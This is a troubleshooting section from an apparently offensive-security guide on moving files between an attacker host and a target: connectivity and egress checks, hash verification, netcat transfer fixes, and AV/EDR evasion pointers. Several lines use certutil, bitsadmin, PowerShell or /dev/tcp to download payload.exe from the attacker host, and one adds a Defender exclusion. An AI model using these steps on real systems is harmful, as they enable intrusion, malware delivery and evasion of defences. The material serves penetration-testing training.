# 14 - Troubleshooting

> [← README](../../README.md) · [Next section →](15-for-blue-team.md)

What to do when the transfer won't go through, the file comes out corrupt, or AV blocks it. Below: common problems, diagnostics, and a breakdown by transport.

> **Covered elsewhere:** encoding - [10](10-encoding.md), encryption - [11](11-encryption.md), DNS/ICMP - [12](12-dns-icmp.md), steganography - [13](13-stegano.md).

---

## Navigation

|  |  |
|---|---|
| [Typical problems](#typical-problems) | [1. Is the traffic getting through (connectivity diagnostics)](#1-is-the-traffic-getting-through-connectivity-diagnostics) |
| [2. Egress / firewall diagnostics](#2-egress--firewall-diagnostics) | [3. File integrity check](#3-file-integrity-check) |
| [4. File gets corrupted (binary mode)](#4-file-gets-corrupted-binary-mode) | [5. Interrupted / incomplete file](#5-interrupted--incomplete-file) |
| [6. AV/EDR blocks it](#6-avedr-blocks-it) | [7. No `wget`/`curl`, or PowerShell is restricted](#7-no-wgetcurl-or-powershell-is-restricted) |
| [8. Slow transfer](#8-slow-transfer) | [9. Breakdown by transport](#9-breakdown-by-transport) |

---

## Typical problems

| Problem | Cause | Fix |
|----------|---------|---------|
| Firewall blocks it | egress filters the port | port **80/443** (or 53/udp) - see [01](01-attacker-to-target.md) |
| AV blocks the file | signature/heuristics | obfuscation/encryption ([11](11-encryption.md)), LOLBins ([09](09-lolbins.md)) |
| No `wget`/`curl` | stripped-down system | `bash /dev/tcp` ([07](07-netcat.md)), python/perl/php ([01](01-attacker-to-target.md)) |
| PowerShell restricted | policies/AMSI | `certutil`, `bitsadmin`, `mshta` ([01](01-attacker-to-target.md), [09](09-lolbins.md)) |
| BITS `0x80200013` | server ignores `Range` (`python3 -m http.server`, `php -S`) | check with `curl -H 'Range: bytes=0-9'`; add `/dynamic`/`-Dynamic`, or serve with `busybox`/`ruby`/`nginx`/`updog` - [01](01-attacker-to-target.md#bitsadmin-cmd) |
| Corrupt file | text mode, dropped transfer | binary mode, hash check (§3), compression+base64 ([10](10-encoding.md)) |
| Slow transfer | channel/protocol | compress ([10](10-encoding.md)), switch transport |
| Nothing downloads | no connectivity | diagnostics (§1-§2) |
| `net use`/SMB fails | guest/signing/445 | see [03](03-smb.md) |
| WebDAV won't mount | WebClient service/limit | see [04](04-webdav.md) |
| FTP hangs | active mode/NAT | passive mode, `--range` ([05](05-ftp.md)) |
| `nc` "hangs" on receive | no `-q 0`/`-N` | see [07](07-netcat.md) |
| WinRM refuses | workgroup/TrustedHosts | see [08](08-rdp-winrm.md) |

---

## 1. Is the traffic getting through (connectivity diagnostics)

### RHOST → LHOST (does the target see us?)

**Linux:**
```bash
curl -I http://$LHOST || wget --spider http://$LHOST
```

**Linux - check a specific port:**
```bash
nc -zv $LHOST 80
```

**Windows - PowerShell:**
```powershell
Test-NetConnection $LHOST -Port 80
```

**Windows - CMD:**
```cmd
powershell -c "Test-NetConnection %LHOST% -Port 80"
```

### Is LHOST listening?

**Linux:**
```bash
ss -tlnp | grep -E ':(80|443|8000)'
```

**Windows:**
```cmd
netstat -ano | findstr LISTENING
```

> If `curl -I` on RHOST is silent while LHOST is listening, the problem is the **egress firewall** between them (see §2), not the server.

---

## 2. Egress / firewall diagnostics

**Check where you can actually go (Linux):**
```bash
for p in 80 443 53 8080 4444; do timeout 2 bash -c "echo > /dev/tcp/$LHOST/$p" 2>/dev/null && echo "$p open" || echo "$p closed"; done
```

**Check DNS (does a name resolve):**
```bash
nslookup example.com
```

**Check HTTP through a proxy (Linux):**
```bash
curl -x http://proxy:8080 -I http://$LHOST
```

**Check HTTP through the system proxy (Windows):**
```powershell
$wc = New-Object Net.WebClient; $wc.Proxy = [Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$wc.DownloadString("http://${LHOST}/")
# literal IP:
# $wc.DownloadString("http://192.168.2.5/")
```

> Common causes: egress only on 80/443, DNS blocked outbound, a mandatory corporate proxy, TLS inspection. In that case, go DNS/ICMP ([12](12-dns-icmp.md)).

---

## 3. File integrity check

Compute the hash **before** and **after** the transfer - otherwise a single corrupt byte goes unnoticed.

**Linux (LHOST and RHOST):**
```bash
sha256sum payload.exe
```

```bash
md5sum payload.exe
```

**Windows - PowerShell:**
```powershell
Get-FileHash payload.exe -Algorithm SHA256
```

**Windows - CMD:**
```cmd
certutil -hashfile payload.exe SHA256
```

> Hashes don't match → almost always **text mode** (FTP ASCII, `curl` without `--data-binary`, PowerShell `Get-Content` without `-Raw`/`-Encoding Byte`) or a dropped channel. See §4.

---

## 4. File gets corrupted (binary mode)

**FTP - binary is mandatory (Linux):**
```bash
ftp> binary
```

**FTP - binary on Windows (`ftp -s:` script):**
```text
binary
```

**curl - raw body, no transformations:**
```bash
curl --data-binary @file.bin http://$LHOST/upload
```

**curl - file upload (PUT):**
```bash
curl -T file.bin http://$LHOST/
```

**PowerShell - read bytes, not text:**
```powershell
[IO.File]::ReadAllBytes("C:\Users\Public\file.bin")
```

**PowerShell - write bytes:**
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\file.bin", $bytes)
```

> `Get-Content`/`Set-Content` work on text by default and may add `\r\n`/BOM. For binaries use `[IO.File]::ReadAllBytes`/`WriteAllBytes` or `-Encoding Byte` (Windows PowerShell 5.1).

**certutil - account for the PEM headers:**
```cmd
certutil -decode file.b64 payload.exe
```
`certutil -encode` adds `-----BEGIN CERTIFICATE-----` and 64-character line breaks - GNU `base64 -d` won't understand that. Encoded with certutil - decode with certutil.

---

## 5. Interrupted / incomplete file

**netcat - close the connection on EOF:**
```bash
nc -lvnp 4444 -q 0 > file.bin     # GNU/traditional
```

```bash
nc -lvnp 4444 -N > file.bin       # OpenBSD
```

**tar over the network - without `-q 0`/`-N` the archive never closes:**
```bash
nc -lvnp 4444 -q 0 | tar xzf -
```

**Resume a download (Linux):**
```bash
wget -c http://$LHOST/large.tar
```

> Check the size on both ends (`ls -l` / `stat`), then the hash (§3). For large files use `split` + reassembly, or `rsync` ([06](06-scp-sftp-rsync.md)).

---

## 6. AV/EDR blocks it

- **Obfuscation/encryption** - [11](11-encryption.md).
- **LOLBins instead of your own binaries** - [09](09-lolbins.md) (`certutil`, `bitsadmin`, `mshta`, `regsvr32`).
- **In-memory / fileless** - [01](01-attacker-to-target.md), [11](11-encryption.md).
- **Containers** (ISO+LNK, OneNote, password-protected archive) are payload delivery, not file transport; see [01](01-attacker-to-target.md) and [09](09-lolbins.md).
- **Defender exclusion** (in the lab, with admin rights):
```powershell
Add-MpPreference -ExclusionPath "$PWD"
```
- **Test against current AV in an isolated lab** - [15 - For Blue Team](15-for-blue-team.md).

---

## 7. No `wget`/`curl`, or PowerShell is restricted

**Linux - `/dev/tcp` (bash only):**
```bash
cat < /dev/tcp/$LHOST/80 > file
```

**Linux - python:**
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$LHOST/file','file')"
```

**Windows - certutil:**
```cmd
certutil -urlcache -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**Windows - bitsadmin:**
```cmd
bitsadmin /transfer job /download /priority high http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**Windows - PowerShell `iwr`:**
```powershell
iwr http://$LHOST/payload.exe -OutFile C:\Users\Public\payload.exe
```

> Full lists are in [01 - Attacker → Target](01-attacker-to-target.md) and [09 - LOLBins](09-lolbins.md).

---

## 8. Slow transfer

- **Compress** before sending - [10](10-encoding.md) (`gzip`/`xz`/`zstd` + base64).
- **Fewer layers** - every encode/decode adds time.
- **A different transport** - SMB/FTP/SCP are faster than DNS/ICMP ([12](12-dns-icmp.md)).
- **Parallelize** - `split` + several streams, or `aria2c -x` ([09](09-lolbins.md)).

---

## 9. Breakdown by transport

| Transport | Common problem | Where to look |
|-----------|-----------------|---------------|
| HTTP | port blocked / proxy | §2, [01](01-attacker-to-target.md) |
| SMB | guest disabled, signing, 445 | [03](03-smb.md) |
| WebDAV | `WebClient` service, `BasicAuthLevel`, 50 MB limit | [04](04-webdav.md) |
| FTP | active mode, NAT, forgot `-w` | [05](05-ftp.md) |
| SCP/SFTP | `-P` vs `-p`, host key, needs `sshd` | [06](06-scp-sftp-rsync.md) |
| Netcat | no `-q 0`/`-N`, BIND vs REVERSE | [07](07-netcat.md) |
| RDP/WinRM | TrustedHosts, 5985/5986 | [08](08-rdp-winrm.md) |
| DNS/ICMP | no delegation, `--no-cache`, egress | [12](12-dns-icmp.md) |
| Steganography | file recompressed, wrong password, small cover capacity | [13](13-stegano.md) |

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [05 - FTP](05-ftp.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [07 - Netcat](07-netcat.md) · [08 - RDP/WinRM](08-rdp-winrm.md) · [09 - LOLBins](09-lolbins.md) · [10 - Encoding](10-encoding.md) · [11 - Encryption](11-encryption.md) · [12 - DNS / ICMP](12-dns-icmp.md) · [13 - Steganography](13-stegano.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST
```

> **About the OS in examples:** where a command is OS-specific, it's marked **Linux:** or **Windows:**.

---

[← Back to the index](../../README.md)
